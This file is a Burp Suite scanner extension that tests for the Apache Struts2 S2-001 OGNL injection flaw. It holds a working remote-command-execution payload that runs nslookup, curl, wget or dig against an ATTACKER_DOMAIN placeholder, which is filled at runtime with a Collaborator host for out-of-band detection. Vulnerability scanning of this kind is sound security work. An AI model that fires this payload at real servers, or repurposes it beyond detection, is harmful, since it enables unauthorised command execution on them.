from burp import IBurpExtender
from burp import IScannerCheck
from burp import IScanIssue
from array import array
from burp import IBurpCollaboratorClientContext


CMD='''%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"OOB_CMD","ATTACKER_DOMAIN"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
'''

OBB_CMD_LISTS = ['nslookup', 'curl', 'wget', "dig"]

class BurpExtender(IBurpExtender, IScannerCheck):

    #
    # implement IBurpExtender
    #

    def registerExtenderCallbacks(self, callbacks):
        # keep a reference to our callbacks object
        self._callbacks = callbacks

        # obtain an extension helpers object
        self._helpers = callbacks.getHelpers()

        # set our extension name
        callbacks.setExtensionName("Apache Struts2 S2-001 RCE (OOB)")

        # register ourselves as a custom scanner check
        callbacks.registerScannerCheck(self)

    # helper method to search a response for occurrences of a literal match string
    # and return a list of start/end offsets

    def _get_matches(self, response, match):
        matches = []
        start = 0
        reslen = len(response)
        matchlen = len(match)
        while start < reslen:
            start = self._helpers.indexOf(response, match, True, start, reslen)
            if start == -1:
                break
            matches.append(array('i', [start, start + matchlen]))
            start += matchlen

        return matches

    #
    # implement IScannerCheck
    #

    def doPassiveScan(self, baseRequestResponse):
        return None


    def doActiveScan(self, baseRequestResponse, insertionPoint):
        all_issues = []
        #generate payload
        for c in OBB_CMD_LISTS:

            collaboratorContext = self._callbacks.createBurpCollaboratorClientContext()
            urlDnsCollaboratorUrl = collaboratorContext.generatePayload(True)
        
            payload_string = CMD.replace('OOB_CMD', c).replace('ATTACKER_DOMAIN',urlDnsCollaboratorUrl)

            #print(payload_string)
            #INJ_CMD = bytearray(payload_string,'ascii')
            INJ_CMD=self._helpers.stringToBytes(payload_string)
            # make a request containing our injection test in the insertion point
            checkRequest = insertionPoint.buildRequest(INJ_CMD)
            #checkRequest = buildUnencodedRequest(insertionPoint,INJ_CMD)
            checkRequestResponse = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest)

            if not collaboratorContext.fetchCollaboratorInteractionsFor(urlDnsCollaboratorUrl) :
                continue
            else:   
                #print(collaboratorContext.fetchCollaboratorInteractionsFor(urlDnsCollaboratorUrl))
                # get the offsets of the payload within the request, for in-UI highlighting
                requestHighlights = [insertionPoint.getPayloadOffsets(INJ_CMD)]

                # report the issue
                new_issue = CustomScanIssue(
                    baseRequestResponse.getHttpService(),
                    self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
                    [self._callbacks.applyMarkers(checkRequestResponse, requestHighlights, None)],
                    "Apache struts2 OGNL Injection (OOB)",
                    "Receive connection to collaborator",
                    "High")
                all_issues.append(new_issue)

        if not all_issues:
            return None
        else:
            return all_issues
    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        # This method is called when multiple issues are reported for the same URL 
        # path by the same extension-provided check. The value we return from this 
        # method determines how/whether Burp consolidates the multiple issues
        # to prevent duplication
        #
        # Since the issue name is sufficient to identify our issues as different,
        # if both issues have the same name, only report the existing issue
        # otherwise report both issues
        if existingIssue.getIssueName() == newIssue.getIssueName():
            return -1

        return 0

#
# class implementing IScanIssue to hold our custom scan issue details
#
class CustomScanIssue (IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, severity):
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail
        self._severity = severity

    def getUrl(self):
        return self._url

    def getIssueName(self):
        return self._name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self._severity

    def getConfidence(self):
        return "Certain"

    def getIssueBackground(self):
        pass

    def getRemediationBackground(self):
        pass

    def getIssueDetail(self):
        return self._detail

    def getRemediationDetail(self):
        pass

    def getHttpMessages(self):
        return self._httpMessages

    def getHttpService(self):
        return self._httpService
